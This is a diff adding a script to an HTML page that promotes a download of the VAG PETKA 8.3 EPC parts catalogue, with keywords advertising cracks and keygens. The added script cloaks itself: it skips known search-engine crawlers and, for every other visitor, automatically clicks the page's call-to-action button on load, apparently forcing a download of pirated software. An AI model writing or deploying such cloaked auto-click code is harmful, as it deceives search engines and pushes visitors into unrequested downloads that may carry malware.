@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VAG PETKA 8.3 EPC 09.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download VAG PETKA 8.3 EPC 09.2024, the ultimate spare parts catalog for Audi, Skoda, Seat, Volkswagen, and Porsche.">
     <meta name="keywords" content="VAG PETKA 8.3 EPC 09.2024, VAG PETKA EPC 09.2024, VAG PETKA 8.3 EPC download, VAG PETKA 8.3 EPC free download, VAG PETKA 8.3 EPC 2024, VAG PETKA spare parts catalog download, VAG spare parts catalog EPC, Audi EPC download, Skoda EPC download, Seat EPC download, Volkswagen EPC download, Porsche EPC download, VAG PETKA electronic parts catalog, VAG PETKA EPC keygen, VAG PETKA EPC crack, Microcat VAG EPC 2024, Microcat VAG EPC download, Microcat VAG EPC free download, Электронный каталог запасных частей VAG PETKA, Электронный каталог VAG PETKA скачать, Электронный каталог запчастей VAG PETKA 2024 бесплатно, Скачать каталог запчастей VAG PETKA 8.3 EPC, Каталог запчастей VAG PETKA бесплатно, Каталог запчастей Audi скачать, Каталог запчастей Skoda скачать, Каталог запчастей Seat скачать, Каталог запчастей Volkswagen скачать, VAG PETKA каталог запчастей скачать, Ключ для VAG PETKA EPC, Крэк для VAG PETKA EPC">
     <style>
